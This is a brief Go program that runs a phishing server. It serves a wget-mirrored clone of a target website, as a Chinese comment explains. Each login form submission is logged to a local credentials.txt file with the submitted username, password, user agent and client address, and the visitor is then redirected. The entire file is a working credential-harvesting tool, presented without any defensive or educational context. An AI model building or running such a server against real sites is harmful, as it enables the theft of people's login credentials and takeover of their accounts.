package main

import (
	"log"
	"net/http"
	"os"

	"github.com/gorilla/mux"
	"github.com/sirupsen/logrus"
)

const LISTEN_ADDR string = "localhost:8000"

func login(w http.ResponseWriter, r *http.Request) {
	logrus.WithFields(logrus.Fields{
		"username":    r.FormValue("_user"),
		"password":    r.FormValue("_pass"),
		"user-agent":  r.Header.Get("User-Agent"),
		"remote-addr": r.RemoteAddr,
	}).Info("Login attempt")
	http.Redirect(w, r, "/", http.StatusFound)
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		log.Fatalln(err)
	}
	defer fh.Close()
	logrus.SetOutput(fh)

	r := mux.NewRouter()
	r.HandleFunc("/", login).Methods("POST")
	// 这里的路径是相对于执行时的 workdir
	// 使用 wget -r -p -k host 下载源站内容并存为 static-files
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("static-files")))

	log.Printf("Listening on %s\n", LISTEN_ADDR)
	http.ListenAndServe(LISTEN_ADDR, r)
}
